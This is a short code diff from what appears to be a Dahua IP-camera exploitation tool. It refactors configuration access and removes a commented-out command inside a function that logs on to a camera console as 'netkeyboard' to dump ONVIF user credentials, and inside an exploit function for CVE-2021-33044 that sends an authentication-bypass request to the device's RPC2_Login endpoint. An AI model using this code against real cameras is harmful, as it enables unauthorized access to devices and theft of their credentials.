@@ -15,12 +15,6 @@ def dh_console(ip, port, proto='dhip'):
     console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
     user, passwd = '', ''
     try:
-        # with os.popen(f"""
-        # (
-        #     echo "OnvifUser -u"
-        #     echo "quit all"
-        # ) | python -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto} 2>/dev/null
-        # """) as f: items = [line.strip() for line in f]
         cmd = f"""(
             echo "OnvifUser -u"
             echo "quit all"
@@ -42,7 +36,7 @@ def dh_console(ip, port, proto='dhip'):
 
 def cve_2021_33044(ip: str) -> list:
     headers = {
-        'User-Agent': config['USERAGENT'],
+        'User-Agent': config.USERAGENT,
         'Host': ip,
         'Origin': 'http://' + ip,
         'Referer': 'http://' + ip,
@@ -67,10 +61,9 @@ def cve_2021_33044(ip: str) -> list:
         "session": 0,
     }
     url = f"http://{ip}/RPC2_Login"
-    timeout = config['TIMEOUT']
 
     try:
-        r = requests.post(url, headers=headers, json=_json, verify=False, timeout=timeout)
+        r = requests.post(url, headers=headers, json=_json, verify=False, timeout=config.TIMEOUT)
         if r.status_code == 200 and r.json()['result'] == True:
             if ':' in ip: ip, port = ip.split(':')
             else: port = 80
